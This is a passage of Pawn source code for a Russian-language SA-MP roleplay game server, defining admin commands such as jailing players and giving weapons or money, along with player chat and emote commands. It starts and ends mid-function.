	if(sscanf(params, "uiis", params[0], params[1], params[2],  params[3])) return SendClientMessage(playerid, COLOR_WHITE, "Введите: /jail [id игрока] [1/2/3] [минуты] [причина]");
	if(!IsPlayerConnected(params[0])) return SendClientMessage(playerid, COLOR_GREY, TPLAYEROFFLINE);
	if(PlayerLogged[params[0]] == 0) return SendClientMessage(playerid, COLOR_GREY, TPLAYERNLOGGED);
	if(PlayerInfo[params[0]][pJail] > 0) return SendClientMessage(playerid, COLOR_GREY, "Данный игрок уже находиться в тюрьме!");
	if(params[1] < 1 || params[1] > 3) return SendClientMessage(playerid, COLOR_GREY, "Номер тюрьмы от 1 до 3!");
	if(params[2] < 1 || params[2] > 180) return SendClientMessage(playerid, COLOR_GREY, "Кол-во минут от 1 до 180!");
	ResetWeapon(params[0]);
	PlayerInfo[params[0]][pJailTime] = params[2] * 60;
	PlayerInfo[params[0]][pWanted] = 0;
	PlayerCuffed[params[0]] = false;
	SetPlayerVirtualWorld(params[0], 1);
	SetPlayerColor(params[0], 0xFFFFFF00);
	SendMes(params[0], COLOR_LIGHTRED, "Администратор %s (ID: %i) посадил вас в камеру на %i секунд. Причина: %s",PlayerInfo[playerid][pSendername], playerid, params[2]*60, params[3]);
	format(string, 80, "~n~~n~~n~~n~~n~~n~~n~~n~~n~~n~~y~JAILED: ~w~%s", PlayerInfo[playerid][pJailTime]-10);
	GameTextForPlayer(params[0], string, 1000, 3);
	format(totalstring, 100, "Администратор %s посадил в тюрьму %s. Причина: %s", PlayerInfo[playerid][pSendername], sendername(params[0]), params[3]);
	SendClientMessageToAll(COLOR_LIGHTRED, totalstring);
	if(params[1] == 1)
	{
		SetPlayerInterior(params[0], 6);
		SetPlayerPos(params[0],264.1425,77.4712,1001.0391);
		SetPlayerFacingAngle(params[0], 263.0160);
		PlayerInfo[params[0]][pJail] = 1;
		SetPlayerWantedLevel(params[0], 0);
	}
	if(params[1] == 2)
	{
		SetPlayerInterior(params[0], 10);
		SetPlayerPos(params[0],219.5400,109.9767,999.0156);
		SetPlayerFacingAngle(params[0], 1.0);
		PlayerInfo[params[0]][pJail] = 2;
		SetPlayerWantedLevel(params[0], 0);
	}
	if(params[1] == 3)
	{
		SetPlayerInterior(params[0], 3);
		SetPlayerPos(params[0],291.0511,286.8623,996.5789);
		SetPlayerFacingAngle(params[0], 0.0000);
		PlayerInfo[params[0]][pJail] = 3;
		SetPlayerWantedLevel(params[0], 0);
	}
	return true;
}
CMD:id(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, COLOR_WHITE, "Введите: /id [id игрока]");
	if(!IsPlayerConnected(params[0])) return SendClientMessage(playerid, COLOR_GREY, TPLAYEROFFLINE);
	if(PlayerLogged[params[0]] == 0) return SendClientMessage(playerid, COLOR_GREY, TPLAYERNLOGGED);
	SendMes(playerid, COLOR_WHITE, "ID: %d - %s",params[0],sendername(params[0]));
	return true;
}
CMD:givegun(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(PlayerInfo[playerid][pAdmin] < 6 || AdminLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdminDuty] == 0) return SendClientMessage(playerid, COLOR_GREY, YouCanNotAdminDuty);
	if(sscanf(params, "udd", params[0],params[1],params[2])) return SendClientMessage(playerid, COLOR_WHITE, "Введите: /givegun [id игрока] [id оружия] [кол-во патронов]");
	if(!IsPlayerConnected(params[0])) return SendClientMessage(playerid, COLOR_GREY, ""TPLAYEROFFLINE"");
	if(PlayerLogged[params[0]] == 0) return SendClientMessage(playerid, COLOR_GREY, ""TPLAYERNLOGGED"");
	if(params[1] < 1 || params[1] > 47 || params[1] == 27 || params[1] == 1 || params[1] == 2 || params[1] == 17 || params[1] == 19 || params[1] == 4
			|| params[1] == 20 || params[1] == 21 || params[1] == 35 || params[1] == 36 || params[1] == 39 || params[1] == 40 || params[1] == 44 || params[1] == 45
			|| params[1] == 38 || params[1] == 32 || params[1] == 28 || params[1] == 18 || params[1] == 37 || params[1] == 16 || params[1] == 9) return SendClientMessage(playerid, COLOR_GREY, "ID оружия от 1 до 47!");
	if(params[2] > 999 || params[2] < 1) return SendClientMessage(playerid, COLOR_GREY, "Кол-во патронов от 1 до 999!");
	if(PlayerInfo[playerid][pLevel] <= 1) return SendMes(playerid,COLOR_YELLOW,"У 1 лвл запрещена выдача оружия!");
	GiveWeapon(params[0], params[1], params[2]);
	SendMes(playerid, COLOR_ORANGE, "Вы установили оружие игроку: %s",sendername(params[0]));
	return true;
}
CMD:resetgun(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(PlayerInfo[playerid][pAdmin] < 2 || AdminLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdminDuty] == 0) return SendClientMessage(playerid, COLOR_GREY, YouCanNotAdminDuty);
	if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, COLOR_WHITE, "Введите: /resetgun [id игрока]");
	if(!IsPlayerConnected(params[0])) return SendClientMessage(playerid, COLOR_GREY, ""TPLAYEROFFLINE"");
	if(PlayerLogged[params[0]] == 0) return SendClientMessage(playerid, COLOR_GREY, ""TPLAYERNLOGGED"");
	ResetWeapon(params[0]);
	SendMes(playerid, COLOR_ORANGE, "Вы сбросили оружие игроку: %s",sendername(params[0]));
	SendMes(params[0], COLOR_LIGHTRED, "Администратор %s сбросил вам оружие",PlayerInfo[playerid][pSendername]);
	return true;
}
CMD:givemoney(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(PlayerInfo[playerid][pAdmin] < 6 || AdminLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdminDuty] == 0) return SendClientMessage(playerid, COLOR_GREY, YouCanNotAdminDuty);
	if(sscanf(params, "ud", params[0],params[1])) return SendClientMessage(playerid, COLOR_WHITE, "Введите: /givemoney [id игрока] [кол-во денег]");
	if(!IsPlayerConnected(params[0])) return SendClientMessage(playerid, COLOR_GREY, TPLAYEROFFLINE);
	if(PlayerLogged[params[0]] == 0) return SendClientMessage(playerid, COLOR_GREY, TPLAYERNLOGGED);
	if(params[1] > 25000000 || params[1] < 1) return SendClientMessage(playerid, COLOR_GREY, "Кол-во денег от 1 до 25000000!");
	GiveMoney(params[0], params[1]);
	SendMes(playerid, COLOR_ORANGE, "Вы установили денег игроку: %s", sendername(params[0]));
	SendClientMessage(params[0], COLOR_GREEN, "===============[УВЕДОМЛЕНИЕ]================ ");
	SendMes(params[0], COLOR_WHITE, "  Администратор %s выписал вам чек на %d$", PlayerInfo[playerid][pSendername],params[1]);
	SendClientMessage(params[0], COLOR_WHITE, "    Деньги были зачислены на ваш баланс");
	SendClientMessage(params[0], COLOR_GREEN, "== Подпись: Администрация "Namemode" ==");
	format(totalstring, 64, "%s дал %d $ игроку %s", PlayerInfo[playerid][pSendername],params[1],sendername(params[0]));
	Log("GiveMoney",totalstring);
	return true;
}
CMD:givecredits(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(PlayerInfo[playerid][pAdmin] < 6 || AdminLogged[playerid] == false ) return true;
	if(sscanf(params, "ud", params[0],params[1])) return SendClientMessage(playerid, COLOR_WHITE, "Введите: /givecredits [id игрока] [кол-во]");
	if(!IsPlayerConnected(params[0])) return SendClientMessage(playerid, COLOR_GREY, TPLAYEROFFLINE);
	if(PlayerLogged[params[0]] == 0) return SendClientMessage(playerid, COLOR_GREY, TPLAYERNLOGGED);
	if(params[1] > 500 || params[1] < 1) return SendClientMessage(playerid, COLOR_GREY, "Кол-во от 1 до 500!");
	PlayerInfo[params[0]][pCredits] = params[1];
	SendClientMessage(params[0], COLOR_GREEN, "==============УВЕДОМЛЕНИЕ=================");
	SendMes(params[0], COLOR_ORANGE, "На ваш счет было переведено %d кредитов",params[1]);
	SendClientMessage(params[0], COLOR_ORANGE, "       Спасибо за помощь серверу!");
	SendClientMessage(params[0], COLOR_GREEN, "=============================================");
	SendMes(playerid, COLOR_ORANGE, "Вы установили %d кредитов игроку: %s",params[1], sendername(params[0]));
	return true;
}

CMD:resetmoney(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(PlayerInfo[playerid][pAdmin] < 6 || AdminLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdminDuty] == 0) return SendClientMessage(playerid, COLOR_GREY, YouCanNotAdminDuty);
	if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, COLOR_WHITE, "Введите: /resetmoney [id игрока]");
	if(!IsPlayerConnected(params[0])) return SendClientMessage(playerid, COLOR_GREY, TPLAYEROFFLINE);
	if(PlayerLogged[params[0]] == 0) return SendClientMessage(playerid, COLOR_GREY, TPLAYERNLOGGED);
	ResetMoney(params[0]);
	SendMes(playerid, COLOR_ORANGE, "Вы сбросили денег игроку: %s", sendername(params[0]));
	return true;
}

CMD:slap(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(PlayerInfo[playerid][pAdminDuty] == 0) return SendClientMessage(playerid, COLOR_GREY, YouCanNotAdminDuty);
	if(PlayerInfo[playerid][pAdmin] < 1 || AdminLogged[playerid] == false) return true;
	if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, COLOR_WHITE, "Введите: /slap [id игрока]");
	if(!IsPlayerConnected(params[0])) return SendClientMessage(playerid, COLOR_GREY, TPLAYEROFFLINE);
	if(PlayerLogged[params[0]] == 0) return SendClientMessage(playerid, COLOR_GREY, TPLAYERNLOGGED);
	new Float:shealth,Float:slx, Float:sly, Float:slz;
	GetPlayerHealth(params[0], shealth);
	SetHealth(params[0], shealth-5);
	GetPlayerPos(params[0], slx, sly, slz);
	SetPlayerPos(params[0], slx, sly, slz+5);
	PlayerPlaySound(params[0], 1130, slx, sly, slz+5);
	SendMes(playerid, COLOR_ORANGE, "Вы слапнули игрока: %s",sendername(params[0]));
	return true;
}

CMD:aduty(playerid, params[])
{
 	if(PlayerLogged[playerid] == 0) return true;
 	if(PlayerInfo[playerid][pAdminDuty] == 1) return SendClientMessage(playerid, COLOR_GREY, YouCanNotAdminDuty1);
 	if(PlayerInfo[playerid][pAdmin] < 1) return true;
 	ShowPlayerDialog(playerid, D_DOSTUPADM, 3, "Панель управления аккаунтом", "Ведите пароль от админ панели", "Далее", "Закрыть");
 	return true;
}
 
CMD:setsex(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(PlayerInfo[playerid][pAdmin] < 2 || AdminLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdminDuty] == 0) return SendClientMessage(playerid, COLOR_GREY, YouCanNotAdminDuty);
	if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, COLOR_WHITE, "Введите: /setsex [id игрока]");
	if(!IsPlayerConnected(params[0])) return SendClientMessage(playerid, COLOR_GREY, ""TPLAYEROFFLINE"");
	if(PlayerLogged[params[0]] == 0) return SendClientMessage(playerid, COLOR_GREY, ""TPLAYERNLOGGED"");
	switch(PlayerInfo[params[0]][pSex])
	{
	case 1:
		{
			SendMes(playerid, COLOR_ORANGE, "Вы изменили пол игроку %s на женский",sendername(params[0]));
			SendMes(params[0], COLOR_ORANGE, "Администратор %s изменил ваш пол на женский",sendername(params[0]));
			PlayerInfo[params[0]][pSex] = 2;
		}
	case 2:
		{
			SendMes(playerid, COLOR_ORANGE, "Вы изменили пол игроку %s на мужской",sendername(params[0]));
			SendMes(params[0], COLOR_ORANGE, "Администратор %s изменил ваш пол на мужской",sendername(params[0]));
			PlayerInfo[params[0]][pSex] = 1;
		}
	}
	return true;
}


CMD:dinamicskin(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(PlayerInfo[playerid][pAdmin] < 4 || AdminLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdminDuty] == 0) return SendClientMessage(playerid, COLOR_GREY, YouCanNotAdminDuty);
	if(sscanf(params, "ud", params[0],params[1])) return SendClientMessage(playerid, COLOR_WHITE, "Введите: /dinamicskin [id игрока] [id скина]");
	if(!IsPlayerConnected(params[0])) return SendClientMessage(playerid, COLOR_GREY, ""TPLAYEROFFLINE"");
	if(PlayerLogged[params[0]] == 0) return SendClientMessage(playerid, COLOR_GREY, ""TPLAYERNLOGGED"");
	if(params[1] > 299 || params[1] < 1) return SendClientMessage(playerid, COLOR_GREY, "ID скина от 1 до 299!");
	SetPlayerSkin(params[0], params[1]);
	PlayerPlaySound(params[0], 1132, 0.0, 0.0, 0.0);
	SendMes(params[0], COLOR_LIGHTRED, "Администратор %s поставил вам динамический скин",PlayerInfo[playerid][pSendername]);
	SendMes(playerid, COLOR_ORANGE, "Администратор %s поставил вам динамический скин",PlayerInfo[playerid][pSendername]);
	return true;
}
CMD:setskin(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(PlayerInfo[playerid][pAdmin] < 6 || AdminLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdminDuty] == 0) return SendClientMessage(playerid, COLOR_GREY, YouCanNotAdminDuty);
	if(sscanf(params, "ud", params[0],params[1])) return SendClientMessage(playerid, COLOR_WHITE, "Введите: /staticskin [id игрока] [id скина]");
	if(!IsPlayerConnected(params[0])) return SendClientMessage(playerid, COLOR_GREY, ""TPLAYEROFFLINE"");
	if(PlayerLogged[params[0]] == 0) return SendClientMessage(playerid, COLOR_GREY, ""TPLAYERNLOGGED"");
	if(params[1] > 299 || params[1] < 1) return SendClientMessage(playerid, COLOR_GREY, "ID скина от 1 до 299!");
	if(PlayerInfo[params[0]][pChar] > 0) { PlayerInfo[params[0]][pChar] = params[1]; SetPlayerSkin(params[0], PlayerInfo[params[0]][pChar]); }
	else { PlayerInfo[params[0]][pModel] = params[1]; SetPlayerSkin(params[0], PlayerInfo[params[0]][pModel]); }
	SendMes(params[0], COLOR_LIGHTRED, "Администратор %s поставил вам статический скин",PlayerInfo[playerid][pSendername]);
	SendMes(playerid, COLOR_ORANGE, "Вы поставили статический скин игроку %s",sendername(params[0]));
	return true;
}
CMD:exit(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(GetPVarInt(playerid,"AntiFlood") > gettime()) return SendClientMessage(playerid, COLOR_GREY, PlayerCanSendEveryThreeSec);
	SetTimerEx("PickupBack",3000,0,"i",playerid);
	pickupentered[playerid] = 1;
	for(new i = 1; i <= TOTALHOUSE; i++)
	{
		if(IsPlayerInRangeOfPoint(playerid, 15.0, HouseInfo[i][hExitx], HouseInfo[i][hExity], HouseInfo[i][hExitz]) && GetPlayerVirtualWorld(playerid) == HouseInfo[i][hVirtual])
		{
			SetPlayerPos(playerid,HouseInfo[i][hEntrx],HouseInfo[i][hEntry],HouseInfo[i][hEntrz]);
			SetPlayerInterior(playerid,0);
			SetPlayerVirtualWorld(playerid,0);
		}
	}
	for(new i = 1; i <= TOTALBIZZ; i++)
	{
		if(IsPlayerInRangeOfPoint(playerid, 15.0, BizzInfo[i][bExitx], BizzInfo[i][bExity], BizzInfo[i][bExitz]) && GetPlayerVirtualWorld(playerid) == BizzInfo[i][bVirtual])
		{
			SetPlayerPos(playerid,BizzInfo[i][bEntrx], BizzInfo[i][bEntry], BizzInfo[i][bEntrz]);
			SetPlayerInterior(playerid,0);
			SetPlayerVirtualWorld(playerid,0);
		}
	}
	for(new i = 1; i <= TOTALDUCH; i++)
	{
		if(IsPlayerInRangeOfPoint(playerid, 15.0, HouseInfo[i][dExitx], HouseInfo[i][dExity], HouseInfo[i][dExitz]) && GetPlayerVirtualWorld(playerid) == HouseInfo[i][dVirtual])
		{
			SetPlayerPos(playerid,HouseInfo[i][dEntrx],HouseInfo[i][dEntry],HouseInfo[i][dEntrz]);
			SetPlayerInterior(playerid,0);
			SetPlayerVirtualWorld(playerid,0);
		}
	}
	return true;
}

CMD:satiety(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	new stringskill[128];
	new points = 100 - PlayerInfo[playerid][pSatiety];
	new stringa[128];
	for(new i = 0; i < PlayerInfo[playerid][pSatiety]; i++) strcat(stringa, "|");
	for(new i = 0; i < points; i++) strcat(stringa, ".");
	format(stringskill,128,"[%s] %d%s",stringa);
	ShowPlayerDialog(playerid,D_NULL,DIALOG_STYLE_MSGBOX,"« Cытость »",stringskill,"Закрыть","");
	return true;
}

CMD:skill(playerid, params[])
{
	new string[128],percent[2] = "%";
	if(PlayerLogged[playerid] == 0) return true;
	if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, COLOR_WHITE, "Введите: /skill [id игрока]");
	if(!IsPlayerConnected(params[0])) return SendClientMessage(playerid, COLOR_GREY, TPLAYEROFFLINE);
	if(PlayerLogged[params[0]] == 0) return SendClientMessage(playerid, COLOR_GREY, TPLAYERNLOGGED);
	if(!IsPlayerInRangeOfPlayer(8.0, playerid, params[0])) return SendClientMessage(playerid, COLOR_GREY, "Игрок слишком далеко!");
	//=======
	format(string,128,"SDPistol:\t%d%s\nD.Eagle:\t%d%s\nShotGun:\t%d%s\nMP5\t\t%d%s\nAK47:\t\t%d%s\nM4A1:\t\t%d%s",
	PlayerInfo[playerid][pGunSkill][0],percent,PlayerInfo[playerid][pGunSkill][1],percent,PlayerInfo[playerid][pGunSkill][2],percent,PlayerInfo[playerid][pGunSkill][3],percent,PlayerInfo[playerid][pGunSkill][4],percent,PlayerInfo[playerid][pGunSkill][5],percent);
	ShowPlayerDialog(params[0],D_NULL,DIALOG_STYLE_MSGBOX,"Навык владения оружием",string,"Закрыть","");
	//=======
	SendMes(playerid, COLOR_LIGHTBLUE, "Вы показали свои навыки владения оружием %s'у", sendername(params[0]));
	SendMes(params[0], COLOR_LIGHTBLUE, "%s показал вам свои навыки владения оружием", PlayerInfo[playerid][pSendername]);
	format(totalstring, 100, "%s показал(a) свои навыки владения оружием %s", PlayerInfo[playerid][pSendername], sendername(params[0]));
	ProxDetectorNew(playerid, 30.0, COLOR_PURPLE, totalstring);
	return true;
}

CMD:carskill(playerid, params[])
{
	new string[128];
	if(PlayerLogged[playerid] == 0) return true;
	format(string,128,"Навык вождения:\t[ %d]\nДля отключения лимита нужно набрать более 60 единиц навыка",PlayerInfo[playerid][pGunSkill][6] / 10);
	ShowPlayerDialog(playerid,D_NULL,DIALOG_STYLE_MSGBOX,"« Навык вождения »",string,"Закрыть","");
	return true;
}
CMD:tskill(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	new string[128];
	if(PlayerInfo[playerid][pTruckSkill] <= 10000)
	{
		format(string,128,"Уровень дальнобойщика: Новичек\tВаш опыт дальнобойщика: %d/10000",PlayerInfo[playerid][pTruckSkill]);
		ShowPlayerDialog(playerid,D_NULL,DIALOG_STYLE_MSGBOX,"« Навык дальнобойщика »",string,"Закрыть","");
	}
	else if(PlayerInfo[playerid][pTruckSkill] <= 25000)
	{
		format(string,128,"Уровень дальнобойщика: Освоившийся\tВаш опыт дальнобойщика: %d/25000",PlayerInfo[playerid][pTruckSkill]);
		ShowPlayerDialog(playerid,D_NULL,DIALOG_STYLE_MSGBOX,"« Навык дальнобойщика »",string,"Закрыть","");
	}
	else if(PlayerInfo[playerid][pTruckSkill] <= 100000)
	{
		format(string,128,"Уровень дальнобойщика: Король дорог\tВаш опыт дальнобойщика: %d/100000",PlayerInfo[playerid][pTruckSkill]);
		ShowPlayerDialog(playerid,D_NULL,DIALOG_STYLE_MSGBOX,"« Навык дальнобойщика »",string,"Закрыть","");
	}
	return true;
}
CMD:smoke(playerid, params[])
{
	new string[64];
	if(PlayerLogged[playerid] == 0) return true;
	if(PlayerInfo[playerid][pCiggare] == 0) return SendClientMessage(playerid,COLOR_GREY,"У вас нету сигар, купите их в супермаркете или 24/7");
	SetPlayerSpecialAction(playerid,SPECIAL_ACTION_SMOKE_CIGGY);
	SetHealth(playerid,PlayerInfo[playerid][pHeal]+ 7);
	PlayerInfo[playerid][pCiggare]--;
	format(string, 64, "%s достал сигару и прикурил её", PlayerInfo[playerid][pSendername]);
	ProxDetectorNew(playerid,25.0,COLOR_PURPLE,string);
	return true;
}
CMD:maskon(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(PlayerInfo[playerid][pMask] == 0) return SendClientMessage(playerid,COLOR_GREY,"У вас нету маски, купите ее в супермаркете или 24/7");
	SetPlayerColor(playerid,COLOR_BLACK);
	ProxDetectorNew(playerid,25.0,COLOR_PURPLE,"Кто-то достал маску и надел ее");
	return true;
}
CMD:maskoff(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	new string[64];
	if(PlayerInfo[playerid][pMask] == 0) return SendClientMessage(playerid,COLOR_GREY,"У вас нету маски, купите ее в супермаркете или 24/7");
	format(string, 64, "%s снял(а) маску с лица", PlayerInfo[playerid][pSendername]);
	SetPlayerColor(playerid,0xFFFFFF11);
	ProxDetectorNew(playerid,25.0,COLOR_PURPLE,string);
	return true;
}
CMD:piss(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	new string[64];
	SetPlayerSpecialAction(playerid, 68);
	format(string, 64, "%s справляет нужду", PlayerInfo[playerid][pSendername]);
	ProxDetectorNew(playerid,25.0,COLOR_PURPLE,string);
	//PlayerPlaySound(playerid,14200,0.0,0.0,0.0);
	return true;
}
CMD:wank(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	new string[64];
	format(string, 64, "%s опустил штаны и начал грязное дело", PlayerInfo[playerid][pSendername]);
	ProxDetectorNew(playerid,25.0,COLOR_PURPLE,string);
	ApplyAnimation(playerid,"PAULNMAC", "wank_loop", 1.800001, 1, 0, 0, 1, 600);
	PlayerPlaySound(playerid,20803,0.0,0.0,0.0);
	return true;
}

CMD:sprunk(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(PlayerInfo[playerid][pSprunk] == 0) return SendClientMessage(playerid,COLOR_GREY,"У вас нету лимонада, купите его в супермаркете или 24/7");
	SetPlayerSpecialAction(playerid,SPECIAL_ACTION_DRINK_SPRUNK);
	SetHealth(playerid,PlayerInfo[playerid][pHeal]+ 5);
	PlayerInfo[playerid][pSprunk]--;
	format(totalstring, 64, "%s достал(а) банку лимонада и открыл ее", PlayerInfo[playerid][pSendername]);
	ProxDetectorNew(playerid,25.0,COLOR_PURPLE,totalstring);
	PlayerPlaySound(playerid,42600,0.0,0.0,0.0);
	return true;
}

CMD:time(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(PlayerInfo[playerid][pWatch] == 0) return SendClientMessage(playerid,COLOR_GREY,"У вас нету часов, купите его в супермаркете или 24/7");
	new mtext[20];
	new year, month,day;
	getdate(year, month, day);
	if(month == 1) { mtext = "January"; }
	else if(month == 2) { mtext = "February"; }
	else if(month == 3) { mtext = "March"; }
	else if(month == 4) { mtext = "April"; }
	else if(month == 5) { mtext = "May"; }
	else if(month == 6) { mtext = "June"; }
	else if(month == 7) { mtext = "Juli"; }
	else if(month == 8) { mtext = "August"; }
	else if(month == 9) { mtext = "September"; }
	else if(month == 10) { mtext = "October"; }
	else if(month == 11) { mtext = "November"; }
	else if(month == 12) { mtext = "December"; }
	new hour,minuite,second;
	gettime(hour,minuite,second);
	if (minuite < 10)
	{
		if (PlayerInfo[playerid][pJailTime] > 0) format(totalstring, 128, "~y~%d %s~n~~g~|~w~%d:0%d~g~|~n~~w~Jail Time Left: %d sec", day, mtext, hour, minuite, PlayerInfo[playerid][pJailTime]-10);
		else format(totalstring, 127, "~y~%d %s~n~~g~|~w~%d:0%d~g~|", day, mtext, hour, minuite);
	}
	else
	{
		if (PlayerInfo[playerid][pJailTime] > 0) format(totalstring, 128, "~y~%d %s~n~~g~|~w~%d:%d~g~|~n~~w~Jail Time Left: %d sec", day, mtext, hour, minuite, PlayerInfo[playerid][pJailTime]-10);
		else format(totalstring, 127, "~y~%d %s~n~~g~|~w~%d:%d~g~|", day, mtext, hour, minuite);
	}
	GameTextForPlayer(playerid, totalstring, 5000, 1);
	ApplyAnimation(playerid,"COP_AMBIENT","Coplook_watch",4.1,0,0,0,0,0,1);
	format(totalstring, 64, "%s взглянул(а) на часы", PlayerInfo[playerid][pSendername]);
	ProxDetectorNew(playerid,30.0,COLOR_PURPLE,totalstring);
	return true;
}
CMD:veh(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(PlayerInfo[playerid][pAdmin] < 4 || AdminLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdminDuty] == 0) return SendClientMessage(playerid, COLOR_GREY, YouCanNotAdminDuty);
	//if(GetPVarInt(playerid,"CREATEVEH") > 0) return SendClientMessage(playerid, COLOR_GREY,"Необходимо удалить прошлый транспорт!");
	if(GetPlayerInterior(playerid) > 0) return true;
	if(sscanf(params, "ddd", params[0],params[1],params[2])) return SendClientMessage(playerid, COLOR_WHITE, "Введите: /veh [id машины] [цвет 1] [цвет 2]");
	if(params[0] > 611 || params[0] < 400) return SendClientMessage(playerid, COLOR_GREY, "ID транспорта от 400 до 611!");
	if(params[1] > 255 || params[1] < 0) return SendClientMessage(playerid, COLOR_GREY, "ID цвета от 0 до 255!");
	if(params[2] > 255 || params[2] < 0) return SendClientMessage(playerid, COLOR_GREY, "ID цвета от 0 до 255!");
	new Float:X,Float:Y,Float:Z;
	DestroyVehicle(GetPVarInt(playerid,"CREATEVEH"));
	DeletePVar(playerid,"CREATEVEH");
	GetPlayerPos(playerid, X,Y,Z);
	new carid = CreateVehicle(params[0], X,Y,Z, 0.0, params[1], params[2], 60000);
	PutPlayerInVehicle(playerid, carid, 0);
	Fuel[carid] = 100;
	Engine[carid] = true;
	Lights[carid] = false;
	SendMes(playerid, COLOR_WHITE, "Транспорт создан. ID: %d", carid);
	SetPVarInt(playerid,"CREATEVEH",carid);
	format(totalstring,64,"%s создал авто %d, цвет:%d/%d",PlayerInfo[playerid][pSendername],params[0],params[1],params[2]);
	Log("CreateVeh",totalstring);
	return true;
}
CMD:dveh(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(PlayerInfo[playerid][pAdmin] < 4 || AdminLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdminDuty] == 0) return SendClientMessage(playerid, COLOR_GREY, YouCanNotAdminDuty);
	if(!GetPVarInt(playerid,"CREATEVEH")) return SendClientMessage(playerid, COLOR_GREY,"Необходимо создать транспорт!");
	DestroyVehicle(GetPVarInt(playerid,"CREATEVEH"));
	SendMes(playerid, COLOR_WHITE, "Транспорт удален. ID: %d", GetPVarInt(playerid,"CREATEVEH"));
	DeletePVar(playerid,"CREATEVEH");
	return true;
}
CMD:hp(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(PlayerInfo[playerid][pAdmin] < 4 || AdminLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdminDuty] == 0) return SendClientMessage(playerid, COLOR_GREY, YouCanNotAdminDuty);
	if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GREY, PlayerIsNotInCar);
	RepairVehicle(GetPlayerVehicleID(playerid));
	SendClientMessage(playerid, COLOR_WHITE, "Ваша машина отремонтирована");
	return true;
}
CMD:do(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(sscanf(params, "s[64]", params[0])) return SendClientMessage(playerid, COLOR_WHITE, "Введите: /do [текст]");
	if(PlayerInfo[playerid][pMuted] > 0) return SendClientMessage(playerid, COLOR_PURPLE, PlayerHaveMuteTime);
	if(GetPVarInt(playerid,"AntiFlood") > gettime()) return SendClientMessage(playerid, COLOR_GREY, PlayerCanSendEveryThreeSec);
	format(totalstring, 90, "%s (( %s ))",params[0],PlayerInfo[playerid][pSendername]);
	ProxDetectorNew(playerid,30.0,COLOR_PURPLE,totalstring);
	return true;
}
CMD:try(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(sscanf(params, "s[64]", params[0])) return SendClientMessage(playerid, COLOR_WHITE, "Введите: /try [текст]");
	if(PlayerInfo[playerid][pMuted] > 0) return SendClientMessage(playerid, COLOR_PURPLE, PlayerHaveMuteTime);
	if(GetPVarInt(playerid,"AntiFlood") > gettime()) return SendClientMessage(playerid, COLOR_GREY, PlayerCanSendEveryThreeSec);
	new temptryrand = random(2);
	if(temptryrand == 1) format(totalstring, 90, "%s попытался %s {1CEF00}| удачно",PlayerInfo[playerid][pSendername],params[0]);
	else format(totalstring, 90, "%s попытался %s {FF0000}| неудачно",PlayerInfo[playerid][pSendername],params[0]);
	ProxDetectorNew(playerid,30.0,COLOR_PURPLE,totalstring);
	return true;
}
CMD:me(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(sscanf(params, "s[64]", params[0])) return SendClientMessage(playerid, COLOR_WHITE, "Введите: /me [текст]");
	if(PlayerInfo[playerid][pMuted] > 0) return SendClientMessage(playerid, COLOR_PURPLE, PlayerHaveMuteTime);
	if(GetPVarInt(playerid,"AntiFlood") > gettime()) return SendClientMessage(playerid, COLOR_GREY, PlayerCanSendEveryThreeSec);
	format(totalstring, 90, "%s %s", PlayerInfo[playerid][pSendername],params[0]);
	ProxDetectorNew(playerid,30.0,COLOR_PURPLE,totalstring);
	SetPlayerChatBubble(playerid, params[0], COLOR_PURPLE, 30.0, 7000);
	return true;
}
CMD:setfuel(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(PlayerInfo[playerid][pAdmin] < 4 || AdminLogged[playerid] == false) return true;
	if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GREY, ""PlayerIsNotInCar"");
	if(PlayerInfo[playerid][pAdminDuty] == 0) return SendClientMessage(playerid, COLOR_GREY, YouCanNotAdminDuty);
	if(sscanf(params, "d", params[0])) return SendClientMessage(playerid, COLOR_WHITE, "Введите: /setfuel [кол-во бензина]");
